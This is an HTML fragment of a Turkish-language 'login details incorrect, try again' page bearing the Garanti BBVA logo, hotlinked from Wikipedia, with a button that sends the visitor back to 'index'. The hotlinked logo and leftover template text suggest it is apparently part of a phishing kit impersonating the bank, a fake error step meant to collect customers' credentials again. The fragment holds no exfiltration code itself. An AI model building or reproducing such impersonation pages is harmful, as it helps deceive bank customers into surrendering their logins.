  ...
  <main id="content" role="main" class="main">
    ...
    <div class="container py-5 py-sm-7">
      <a class="d-flex justify-content-center mb-5" href="index.html">
        <img class="zi-2" src="https://upload.wikimedia.org/wikipedia/tr/thumb/7/75/Garanti_BBVA.png/200px-Garanti_BBVA.png" alt="Image Description" style="width: 12rem;">
      </a>
      ...
      <div class="mx-auto" style="max-width: 30rem;">
        ...
        <div class="card card-lg mb-5">
          <div class="card-body text-center">
            <div class="mb-4">
              <img class="avatar avatar-xxl avatar-4x3" src="asset/error.png" style="width:150; margin-top: 20px;" alt="Image Description" data-hs-theme-appearance="default">
            ...
            <div class="mb-5">
              <h1 class="display-5">Giriş bilgileriniz hatalı.</h1>
              <p class="mb-0">Lütfen tekrar deneyiniz.</p>
              <button onclick="window.location.href='index'" style="border:0;background:red;padding:10px;margin-top:10px;color:White;font-size:15px;font-weight:500;border-radius:10px">Tekrar Dene</button>
                    </div>
